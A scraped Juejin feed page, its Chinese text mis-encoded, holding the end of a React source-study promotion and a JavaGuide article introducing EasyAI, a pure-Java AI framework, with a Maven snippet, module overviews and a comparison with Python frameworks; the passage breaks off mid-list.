<p>æ— è®ºä½ æ˜¯å¦é€‰æ‹©æ·±å…¥é˜…è¯» React æºç ï¼Œä¿æŒå­¦ä¹ çš„å¿ƒæ€å’Œå¯¹æŠ€æœ¯çš„çƒ­æƒ…ï¼Œæ¯”æŒæ¡ä»»ä½•ç‰¹å®šçš„æŠ€æœ¯æ ˆéƒ½æ›´é‡è¦ã€‚æŠ€æœ¯ä¼šå˜åŒ–ï¼Œä½†å­¦ä¹ èƒ½åŠ›æ˜¯æ°¸æ’çš„ã€‚</p>
<p>å¦‚æœä½ è¯»åˆ°è¿™é‡Œï¼Œè¯´æ˜ä½ å¯¹ React æºç å·²ç»æœ‰ä¸å°çš„å…´è¶£ï¼Œæˆ–è€…æ­£åœ¨è®¤çœŸè€ƒè™‘è¦ä¸è¦ç³»ç»Ÿåœ°å­¦ä¸€éã€‚æœ€è¿‘æˆ‘åˆšåˆšå®Œæˆäº† React æºç çš„ç³»ç»Ÿå­¦ä¹ ï¼Œå¹¶æ•´ç†æˆäº†ä¸€ä¸ªä¸“æ ï¼Œç”¨å¤§é‡ç¤ºæ„å›¾å’Œæµç¨‹å›¾æ¥è®²æ¸…æ¥š Fiber æ¶æ„ã€Hooks çš„å†…éƒ¨å®ç°ã€è°ƒåº¦å™¨ä»¥åŠäº‹ä»¶ç³»ç»Ÿç­‰å…³é”®éƒ¨åˆ†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d7f7002b42f423c9273125fe7c4c1a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603201&amp;x-signature=OUcprCoK9%2Fe2T5hY6KbA7Vr7s6Q%3D" alt="2148a5531fb6563f813d90e0dd467838" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84d367037d4647d1bb23eec2bd2df6e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603201&amp;x-signature=ghnbvIiR2xAiYi7LCGTvKVRC01E%3D" alt="3c465d2e2e4b34ff7d851ecb64f30482" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4dac993292d44f35a779e1bc118c077f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603201&amp;x-signature=KRoTpmH8P%2FkJEgCfFN%2B4Tjy9Qjc%3D" alt="60956e3d526aca95969b8a72bad33364" loading="lazy"/></p>
<p>å¦‚æœä½ æƒ³ç”¨æ›´ç›´è§‚çš„æ–¹å¼æŠŠè¿™äº›çŸ¥è¯†çœŸæ­£åƒé€ï¼Œæ¬¢è¿åŠ æˆ‘å¾®ä¿¡ <code>yunmz777</code> ç§èŠï¼Œä¸€èµ·äº¤æµæºç å­¦ä¹ çš„æ€è·¯å’Œå®è·µç»éªŒã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å›½äº§ AI æ¡†æ¶ EasyAIï¼šè®© Java ç¨‹åºå‘˜ç”¨ Java çš„æ–¹å¼åš AI]]></title>    <link>https://juejin.cn/post/7597635202324873268</link>    <guid>https://juejin.cn/post/7597635202324873268</guid>    <pubDate>2026-01-21T12:31:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597635202324873268" data-draft-id="7597650624637124608" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å›½äº§ AI æ¡†æ¶ EasyAIï¼šè®© Java ç¨‹åºå‘˜ç”¨ Java çš„æ–¹å¼åš AI"/> <meta itemprop="keywords" content="åç«¯,Java"/> <meta itemprop="datePublished" content="2026-01-21T12:31:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JavaGuide"/> <meta itemprop="url" content="https://juejin.cn/user/166781497383294"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å›½äº§ AI æ¡†æ¶ EasyAIï¼šè®© Java ç¨‹åºå‘˜ç”¨ Java çš„æ–¹å¼åš AI
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/166781497383294/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JavaGuide
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T12:31:45.000Z" title="Wed Jan 21 2026 12:31:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸å°‘ Java å°ä¼™ä¼´ç§ä¸‹è·Ÿæˆ‘åæ§½ï¼šç°åœ¨ AI è¿™ä¹ˆç«ï¼Œå’±ä»¬å†™ Java çš„æ˜¯ä¸æ˜¯æ³¨å®šåªèƒ½åœ¨æ—è¾¹çœ‹æˆï¼Ÿ</p>
<p>è¯´å®è¯ï¼Œä»¥å‰ç¡®å®æŒºæ†‹å±ˆçš„ã€‚ä¸»æµ AI æ¡†æ¶å…¨æ˜¯ Python çš„å¤©ä¸‹ï¼ˆTensorFlowã€PyTorch ç­‰ï¼‰ï¼Œå’±ä»¬æƒ³å…¥ä¸ªé—¨ï¼Œä¸ä»…è¦è·¨è¿‡è¯­è¨€é¸¿æ²Ÿï¼Œè¿˜å¾—å»è¶Ÿ CUDAã€cuDNN è¿™ç§â€œç¯å¢ƒé…ç½®åœ°ç‹±â€ã€‚é…ç¯å¢ƒçš„æ—¶é—´æ¯”å†™ä»£ç è¿˜é•¿ï¼Œè¿™ç§ç”Ÿæ€å‰²è£‚æ„ŸçœŸçš„è®©äººå¤´å¤§ ã€‚</p>
<p><strong>EasyAI</strong> çš„å‡ºç°æ­£æ˜¯ä¸ºäº†æ‰“ç ´è¿™ä¸€åƒµå±€ã€‚å®ƒæ˜¯ä¸€ä¸ªç”± Dromara å¼€æºç¤¾åŒºç»´æŠ¤çš„<strong>çº¯ Java å®ç°</strong>çš„äººå·¥æ™ºèƒ½æ¡†æ¶ï¼Œä¸»æ‰“é›¶ä¾èµ–ã€å¼€ç®±å³ç”¨ï¼Œæ—¨åœ¨è®© Java ç¨‹åºå‘˜èƒ½ç”¨è‡ªå·±æœ€ç†Ÿæ‚‰çš„è¯­è¨€å¼€å‘ AI åº”ç”¨ ã€‚</p>
<p>æ³¨æ„ï¼š<strong>EasyAI å’Œ Spring AI ä¸¤è€…ä¸æ˜¯åŒä¸€ç±»ä¸œè¥¿ï¼Œè§£å†³çš„é—®é¢˜ä¸ä¸€æ ·ï¼Œåé¢ä¼šæåˆ°ã€‚</strong></p>
<h2 data-id="heading-0">EasyAI æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>EasyAI æ˜¯ä¸€ä¸ªç”± Dromara å¼€æºç¤¾åŒºç»´æŠ¤çš„åŸç”Ÿ Java äººå·¥æ™ºèƒ½ç®—æ³•æ¡†æ¶ ã€‚å®ƒçš„æ ¸å¿ƒå®šä½éå¸¸éœ¸æ°”ï¼š<strong>è®© Java ç¨‹åºå‘˜ç”¨ Java çš„æ–¹å¼åš AI</strong>ã€‚</p>
<p>å®ƒçš„åœ°ä½å°±åƒ Spring ä¹‹äº JavaWebï¼Œä¸»æ‰“ä¸€ä¸ª<strong>é›¶ä¾èµ–ã€å¼€ç®±å³ç”¨</strong> ã€‚ä½ åªéœ€è¦åœ¨ <code>pom.xml</code> é‡ŒåŠ ä¸€ä¸ªä¾èµ–ï¼Œä¸éœ€è¦å®‰è£… Pythonï¼Œä¸éœ€è¦é…ç½®å¤æ‚çš„æ˜¾å¡é©±åŠ¨ï¼Œç›´æ¥å°±èƒ½è·‘èµ·æ¥ ã€‚</p>
<p><strong>å®ƒçš„æ ¸å¿ƒä¼˜åŠ¿å¦‚ä¸‹</strong>ï¼š</p>
<ul>
<li><strong>é›¶åŸºç¡€å‹å¥½</strong>ï¼šä¸éœ€è¦å­¦ Pythonï¼Œä¸éœ€è¦ç†è§£å¤æ‚çš„ Python ä»£ç  ã€‚</li>
<li><strong>éƒ¨ç½²æç®€</strong>ï¼šMaven ä¸€é”®å¼•å…¥ï¼Œç›´æ¥åµŒå…¥ Java é¡¹ç›®ï¼Œä¸éœ€è¦èµ·é¢å¤–çš„ Python æœåŠ¡ ã€‚</li>
<li><strong>åº•å±‚é€šé€</strong>ï¼šå®ƒä¸ä»…æä¾›å°è£…å¥½çš„æ¨¡å—ï¼Œè¿˜å¼€æ”¾äº†æ·±åº¦å­¦ä¹ ã€æœºå™¨å­¦ä¹ ã€å¼ºåŒ–å­¦ä¹ ç­‰åº•å±‚ç®—æ³•å·¥å…· ã€‚</li>
</ul>
<p>ä½¿ç”¨å®ƒï¼Œåªéœ€è¦åœ¨ <code>pom.xml</code> ä¸­æ·»åŠ ä¾èµ–å³å¯ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.dromara.easyai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>easyAi<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.5.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><strong>å°±è¿™ä¹ˆç®€å•</strong>â€”â€”ä¸éœ€è¦é…ç½® CUDAï¼Œä¸éœ€è¦å®‰è£… Pythonï¼Œä¸éœ€è¦ä¸‹è½½æ¨¡å‹æ–‡ä»¶ã€‚</p>
<h2 data-id="heading-1">å®ƒèƒ½å¸®ä½ æå®šå“ªäº›å®æˆ˜åœºæ™¯ï¼Ÿ</h2>
<p>EasyAI æä¾›ä¸¤ä¸ªå±‚æ¬¡çš„èƒ½åŠ›ï¼š</p>
<p><strong>å±‚æ¬¡ä¸€ï¼šå¼€ç®±å³ç”¨çš„å°è£…æ¨¡å—</strong></p>
<ul>
<li><strong>å›¾åƒè¯†åˆ«</strong>ï¼šåŒ…æ‹¬å›¾åƒç›®æ ‡æ£€æµ‹ï¼ˆæ¯”å¦‚è‡ªåŠ¨è´©å–æœºè¯†åˆ«å•†å“ï¼‰å’Œåƒç´ çº§æŠ å›¾ ã€‚</li>
<li><strong>äººè„¸è¯†åˆ«</strong>ï¼šæ”¯æŒäººè„¸å®šä½å’Œèº«ä»½è¯†åˆ«ï¼Œå·²æœ‰æˆç†Ÿçš„å°è£…åº”ç”¨ ã€‚</li>
<li><strong>æ™ºèƒ½å®¢æœ (sayOrder)</strong> ï¼šè¿™å¥—ç³»ç»Ÿèƒ½è¯†åˆ«ç”¨æˆ·æ„å›¾ã€æŠ“å–å…³é”®è¯ï¼Œè¿˜èƒ½è¿›è¡Œå¤šè½®å¯¹è¯ ã€‚</li>
</ul>
<p><strong>å±‚æ¬¡äºŒï¼šåº•å±‚ç®—æ³•å·¥å…·</strong></p>
<ul>
<li><strong>æ·±åº¦å­¦ä¹ </strong>ï¼šç¥ç»ç½‘ç»œæ„å»º ã€‚</li>
<li><strong>æœºå™¨å­¦ä¹ </strong>ï¼šåˆ†ç±»ã€èšç±»ã€å›å½’ç­‰ç®—æ³• ã€‚</li>
<li><strong>å¼ºåŒ–å­¦ä¹ ä¸å¯å‘å¼å­¦ä¹ </strong> ã€‚</li>
<li><strong>çŸ©é˜µè¿ç®—</strong>ï¼šAI è¿ç®—çš„åŸºç¡€æ•°å­¦åº“ ã€‚</li>
</ul>
<h2 data-id="heading-2">å·²å°è£…çš„åŠŸèƒ½æ¨¡å—è¯¦è§£</h2>
<h3 data-id="heading-3">å›¾åƒç›®æ ‡æ£€æµ‹</h3>
<p>å¯ä»¥åœ¨å›¾åƒä¸­å®šä½å¹¶è¯†åˆ«ç‰¹å®šç‰©ä½“ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd946812e01e4020885611e7654929bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603504&amp;x-signature=OBtBjN6srhWV8Z66d7hgyUaCSlU%3D" alt="" loading="lazy"/></p>
<p><strong>åº”ç”¨åœºæ™¯ä¸¾ä¾‹</strong>ï¼šè‡ªåŠ¨è´©å–æœºè§†è§‰å†…æ ¸â€”â€”è¯†åˆ«ç”¨æˆ·é€‰æ‹©çš„å•†å“ï¼Œè‡ªåŠ¨ç»“ç®—ã€‚</p>
<h3 data-id="heading-4">å›¾åƒè¯­ä¹‰åˆ†å‰²ï¼ˆæŠ å›¾ï¼‰</h3>
<p>å¯¹å›¾åƒè¿›è¡Œåƒç´ çº§åˆ‡å‰²ï¼ŒæŠŠç›®æ ‡ç‰©ä½“ä»èƒŒæ™¯ä¸­åˆ†ç¦»å‡ºæ¥ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/867ba2d738404105be23197d1f012196~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603504&amp;x-signature=fdPp5AW4YDBbbOBFdee95hdFUR8%3D" alt="" loading="lazy"/></p>
<p><strong>æ•ˆæœ</strong>ï¼šè¾“å…¥ä¸€å¼ åŒ…å«äººç‰©çš„ç…§ç‰‡ï¼Œè¾“å‡ºæŠ å¥½çš„äººç‰©å›¾åƒï¼ˆèƒŒæ™¯é€æ˜ï¼‰ã€‚</p>
<h3 data-id="heading-5">äººè„¸è¯†åˆ«</h3>
<p>åŸºäº EasyAI æ¡†æ¶å¼€å‘çš„äººè„¸è¯†åˆ«æ¨¡å—ï¼Œæ”¯æŒï¼š</p>
<ul>
<li>äººè„¸å®šä½ï¼ˆåœ¨å›¾åƒä¸­æ‰¾åˆ°äººè„¸ä½ç½®ï¼‰</li>
<li>äººè„¸è¯†åˆ«ï¼ˆåˆ¤æ–­æ˜¯è°ï¼‰</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af5a82623f704695ad9e2a30c343ce85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603504&amp;x-signature=dcUzSacCT2Si95itn%2B4iM%2FY3sIo%3D" alt="" loading="lazy"/></p>
<p><strong>ç›¸å…³é¡¹ç›®</strong>ï¼š</p>
<ul>
<li>SeeFaceï¼ˆç®—æ³•æºç ï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fldp_dpsmax%2Fsee-face" target="_blank" title="https://gitee.com/ldp_dpsmax/see-face" ref="nofollow noopener noreferrer">gitee.com/ldp_dpsmax/â€¦</a></li>
<li>EasyAI-Faceï¼ˆå°è£…åº”ç”¨ï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Ffushoujiang%2Feasy-ai-face" target="_blank" title="https://gitee.com/fushoujiang/easy-ai-face" ref="nofollow noopener noreferrer">gitee.com/fushoujiangâ€¦</a></li>
</ul>
<h3 data-id="heading-6">æ™ºèƒ½å®¢æœç³»ç»Ÿï¼ˆsayOrderï¼‰</h3>
<p><strong>sayOrder</strong> æ˜¯åŸºäº EasyAI å°è£…çš„æ™ºèƒ½å®¢æœç³»ç»Ÿï¼ŒåŠŸèƒ½åŒ…æ‹¬ï¼š</p>

























<table><thead><tr><th>åŠŸèƒ½</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>æ„å›¾è¯†åˆ«</strong></td><td>åˆ†æç”¨æˆ·è¾“å…¥çš„è¯­ä¹‰ï¼Œè¯†åˆ«ç”¨æˆ·æƒ³åšä»€ä¹ˆï¼ˆç”¨ typeID åŒºåˆ†æ„å›¾ï¼‰</td></tr><tr><td><strong>å…³é”®è¯æŠ“å–</strong></td><td>ä»ç”¨æˆ·è¯­å¥ä¸­æå–ç³»ç»Ÿå…³å¿ƒçš„ä¿¡æ¯ï¼ˆæ—¶é—´ã€åœ°ç‚¹ã€æ•°é‡ç­‰ï¼‰</td></tr><tr><td><strong>å¤šè½®å¯¹è¯</strong></td><td>ä¿¡æ¯ä¸è¶³æ—¶è‡ªåŠ¨è¿½é—®ï¼Œå¼•å¯¼ç”¨æˆ·è¡¥å…¨ä¿¡æ¯</td></tr><tr><td><strong>è‡ªä¸»é—®ç­”</strong></td><td>å›ç­”ç”¨æˆ·çš„å¸¸è§é—®é¢˜</td></tr></tbody></table>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9d0f82194554bc2a6626e489bb057a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603504&amp;x-signature=aTIULseC9vdZI0x1YjCwVmDOVEw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e7239dd4dc44a6b86f5bc795b64863b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603504&amp;x-signature=IdZ2nLZBQqiPszFCeG3jZFHmKDo%3D" alt="" loading="lazy"/></p>
<p>æˆ‘çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fabout-the-author%2Fzhishixingqiu-two-years.html" target="_blank" title="https://javaguide.cn/about-the-author/zhishixingqiu-two-years.html" ref="nofollow noopener noreferrer">æ˜Ÿçƒ</a>ç›®å‰æ­£åœ¨æ›´æ–° <a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fzhuanlan%2Finterview-guide.html" target="_blank" title="https://javaguide.cn/zhuanlan/interview-guide.html" ref="nofollow noopener noreferrer">ã€ŠSpringAI æ™ºèƒ½é¢è¯•å¹³å°+RAG çŸ¥è¯†åº“ã€‹</a>é…å¥—å®æˆ˜é¡¹ç›®æ•™ç¨‹ï¼Œæ¶‰åŠåˆ° Prompt Engineeringã€å¤§æ¨¡å‹é›†æˆã€RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰ã€é«˜æ€§èƒ½å¯¹è±¡å­˜å‚¨ä¸å‘é‡æ•°æ®åº“ã€‚</p>
<p>å†…å®¹éå¸¸å…¨é¢ï¼Œéå¸¸é€‚åˆæƒ³è¦å®æˆ˜ AI é¡¹ç›®æˆ–è€…å‡†å¤‡ AI å¤§æ¨¡å‹åº”ç”¨å¼€å‘å²—ä½é¢è¯•çš„æœ‹å‹ï¼Œæ¥ä¸€å¼ æ˜¨å¤©åˆšå†™å®Œçš„ <strong>3.4w å­—+35 é“é¢˜ç›®çš„ RAG é¢è¯•é¢˜æ€»ç»“</strong>ï¼Œå¤§å®¶æ„Ÿå—ä¸€ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f44bf77afb044e888af058cbf141574~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603504&amp;x-signature=d4g%2BmkbM9XDRfwub05rV6Q6WEzk%3D" alt="" loading="lazy"/></p>
<p><strong>å·¥ä½œæµç¨‹ç¤ºä¾‹</strong>ï¼š</p>
<ol>
<li>ç”¨æˆ·ï¼š"æˆ‘æƒ³å’¨è¯¢ä¸€ä¸‹æ³•å¾‹é—®é¢˜"</li>
<li>ç³»ç»Ÿè¯†åˆ«æ„å›¾ä¸º"æ³•å¾‹å’¨è¯¢"ï¼Œä½†ä¿¡æ¯ä¸è¶³</li>
<li>ç³»ç»Ÿè¿½é—®ï¼š"è¯·é—®æ‚¨æƒ³å’¨è¯¢å“ªæ–¹é¢çš„æ³•å¾‹é—®é¢˜ï¼Ÿ"</li>
<li>ç”¨æˆ·è¡¥å……ä¿¡æ¯ï¼Œç›´åˆ°æ»¡è¶³ä¸šåŠ¡è¦æ±‚</li>
<li>ç³»ç»Ÿç”Ÿæˆå®Œæ•´çš„å’¨è¯¢è®¢å•</li>
</ol>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fdromara%2FsayOrder" target="_blank" title="https://gitee.com/dromara/sayOrder" ref="nofollow noopener noreferrer">gitee.com/dromara/sayâ€¦</a></p>
<h2 data-id="heading-7">EasyAI vs Python AI æ¡†æ¶</h2>













































<table><thead><tr><th>ç»´åº¦</th><th>EasyAI</th><th>Python æ¡†æ¶ï¼ˆTensorFlow/PyTorchï¼‰</th></tr></thead><tbody><tr><td>è¯­è¨€</td><td>Java</td><td>Python</td></tr><tr><td>ä¾èµ–é…ç½®</td><td>é›¶ä¾èµ–ï¼ŒMaven å¼•å…¥</td><td>å¤æ‚ï¼ˆCUDAã€cuDNNã€ç‰ˆæœ¬å…¼å®¹ç­‰ï¼‰</td></tr><tr><td>å­¦ä¹ æ›²çº¿</td><td>ä½ï¼ˆJava å¼€å‘è€…å‹å¥½ï¼‰</td><td>é«˜ï¼ˆéœ€è¦å­¦ Pythonï¼‰</td></tr><tr><td>ç”Ÿæ€ä¸°å¯Œåº¦</td><td>ç›¸å¯¹æœ‰é™</td><td>éå¸¸ä¸°å¯Œ</td></tr><tr><td>æ¨¡å‹èƒ½åŠ›</td><td>å°å¾®æ¨¡å‹ã€è¾¹ç¼˜åœºæ™¯</td><td>å¤§æ¨¡å‹ã€å¤æ‚åœºæ™¯</td></tr><tr><td>éƒ¨ç½²æ–¹å¼</td><td>ç›´æ¥åµŒå…¥ Java é¡¹ç›®</td><td>é€šå¸¸éœ€è¦ç‹¬ç«‹æœåŠ¡</td></tr><tr><td>GPU æ”¯æŒ</td><td>æœ‰é™</td><td>å®Œå–„</td></tr></tbody></table>
<h2 data-id="heading-8">EasyAI é€‚åˆä»€ä¹ˆåœºæ™¯ï¼Ÿ</h2>
<p><strong>EasyAI é€‚åˆçš„åœºæ™¯</strong>ï¼š</p>
<ul>
<li><strong>å°å¾®æ¨¡å‹</strong>ï¼šä¸éœ€è¦è®­ç»ƒè¶…å¤§æ¨¡å‹ï¼Œä¸šåŠ¡åœºæ™¯æ˜ç¡®</li>
<li><strong>Java æŠ€æœ¯æ ˆå›¢é˜Ÿ</strong>ï¼šå›¢é˜Ÿä¸»è¦ç”¨ Javaï¼Œä¸æƒ³å¼•å…¥ Python æœåŠ¡</li>
<li><strong>è¾¹ç¼˜è®¡ç®—/åµŒå…¥å¼</strong>ï¼šèµ„æºæœ‰é™ï¼Œéœ€è¦è½»é‡çº§æ–¹æ¡ˆ</li>
